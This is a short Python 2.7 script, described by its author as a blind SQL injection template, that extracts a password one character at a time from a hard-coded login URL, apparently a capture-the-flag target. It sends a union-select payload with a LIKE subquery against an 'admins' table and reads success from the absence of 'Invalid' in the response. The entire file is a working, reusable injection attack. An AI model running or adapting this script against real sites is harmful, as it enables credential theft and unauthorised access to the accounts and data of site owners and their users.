
#Very Simplish Blind Sql Injection Script Template for Python 2.7.X
import requests
#Sample character set
characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
#Sample target
target = 'http://35.227.24.107:5001/0d9019e4b7/login'
#Sample parameters
username = 'kermit'
password_length = 10
sleepTime = 0
requestTimeOut = 10
r = requests.get(target)
if r.status_code != requests.codes.ok:
        raise ValueError('Sorry! We cannot connect the site...')
else:
        print 'Connection OK! We can go now...'
    #    `1'union select'1' AND EXISTS(SELECT * FROM admins WHERE username='${foundUser}' AND password LIKE '${currentPass}%')'`
#FatalityPunction
def letBlind ():
    foundChars = ''
    for i in range(password_length):
        print i
        for c in characters:
                data={'username':"1'union select'1' AND EXISTS(SELECT * FROM admins WHERE username='kermit' AND password LIKE '"+foundChars+c+"%')'",
                'password' :'1'}
                print "trying___ :"+foundChars+c

                r = requests.post(target, data=data)
                
                if "Invalid" not in r.text:
                    print "We Found it :"+foundChars+c
                    print r.text
                    foundChars += c
                    break
                
                #print foundChars
    print foundChars
#Start show...
letBlind()
